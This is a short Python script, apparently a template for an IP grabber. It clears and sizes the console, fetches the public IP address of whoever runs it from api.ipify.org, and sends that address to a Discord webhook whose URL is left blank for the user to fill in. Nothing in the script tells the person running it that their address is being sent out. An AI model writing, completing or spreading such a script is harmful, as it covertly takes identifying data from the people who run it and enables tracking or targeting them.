import requests
from dhooks import Webhook, Embed
import sys, subprocess
import colorama
import os 
from colorama import Fore, Style
from pystyle import Colorate, Colors, System, Center, Write, Anime
import datetime


System.Clear()
System.Size(125, 25)
System.Title("")             #<----system title


ip = requests.get('https://api.ipify.org/').text
hook = Webhook("")           #<---- webhook here
hook.send(ip)